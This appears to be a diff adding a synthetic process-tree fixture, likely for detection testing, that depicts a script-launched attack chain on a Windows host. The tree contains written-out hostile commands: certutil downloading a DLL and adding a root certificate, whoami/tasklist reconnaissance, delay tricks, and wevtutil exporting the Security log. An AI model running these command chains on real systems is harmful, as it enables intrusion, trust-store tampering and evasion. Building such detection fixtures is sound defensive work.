@@ -1,0 +1,142 @@
+{
+  "pid": 188412,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k Schedule",
+  "children": [
+    {
+      "pid": 188413,
+      "ppid": 188412,
+      "name": "wscript.exe",
+      "command": "wscript.exe //nologo \"C:\\Users\\kiran.kulkarni\\AppData\\Local\\Temp\\Sync_210d02ad.wsf\"",
+      "children": [
+        {
+          "pid": 188420,
+          "ppid": 188413,
+          "name": "certutil.exe",
+          "command": "certutil.exe -urlcache -split -f \"http://intra-update.corp.local/tools/helper.dll\" \"C:\\Users\\kiran.kulkarni\\AppData\\Local\\Temp\\relay.bin\"",
+          "children": [
+            {
+              "pid": 188425,
+              "ppid": 188420,
+              "name": "hostname.exe",
+              "command": "hostname.exe",
+              "children": [
+                {
+                  "pid": 188427,
+                  "ppid": 188425,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe > \"C:\\Users\\kiran.kulkarni\\AppData\\Local\\Temp\\who_3e8455f3.txt\"",
+                  "children": [
+                    {
+                      "pid": 188432,
+                      "ppid": 188427,
+                      "name": "certutil.exe",
+                      "command": "certutil.exe -addstore Root \"C:\\Users\\kiran.kulkarni\\AppData\\Local\\Temp\\intermediate.cer\"",
+                      "children": [
+                        {
+                          "pid": 188433,
+                          "ppid": 188432,
+                          "name": "whoami.exe",
+                          "command": "whoami.exe /priv",
+                          "children": [
+                            {
+                              "pid": 188437,
+                              "ppid": 188433,
+                              "name": "tasklist.exe",
+                              "command": "tasklist.exe /svc",
+                              "children": [
+                                {
+                                  "pid": 188439,
+                                  "ppid": 188437,
+                                  "name": "choice.exe",
+                                  "command": "choice.exe /d y /t 25 > nul",
+                                  "children": [
+                                    {
+                                      "pid": 188441,
+                                      "ppid": 188439,
+                                      "name": "netsh.exe",
+                                      "command": "netsh.exe winhttp show proxy > \"C:\\ProgramData\\Northwind\\Logs\\net_70c84244.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 188448,
+                                          "ppid": 188441,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /all",
+                                          "children": [
+                                            {
+                                              "pid": 188450,
+                                              "ppid": 188448,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 188454,
+                                                  "ppid": 188450,
+                                                  "name": "wevtutil.exe",
+                                                  "command": "wevtutil.exe epl \"Security\" \"C:\\ProgramData\\Contoso\\Logs\\Security_1ab0b027.evtx\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 188472,
+                                                      "ppid": 188454,
+                                                      "name": "ping.exe",
+                                                      "command": "ping.exe -n 5 127.0.0.1 > nul",
+                                                      "children": [
+                                                        {
+                                                          "pid": 188474,
+                                                          "ppid": 188472,
+                                                          "name": "tasklist.exe",
+                                                          "command": "tasklist.exe",
+                                                          "children": [
+                                                            {
+                                                              "pid": 188479,
+                                                              "ppid": 188474,
+                                                              "name": "whoami.exe",
+                                                              "command": "whoami.exe",
+                                                              "children": []
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 188461,
+      "ppid": 188412,
+      "name": "hostname.exe",
+      "command": "hostname.exe > \"C:\\Users\\kiran.kulkarni\\AppData\\Local\\Temp\\host_5b8a35e3.txt\"",
+      "children": [
+        {
+          "pid": 188465,
+          "ppid": 188461,
+          "name": "choice.exe",
+          "command": "choice.exe /d y /t 17 > nul",
+          "children": []
+        }
+      ]
+    }
+  ]
+}
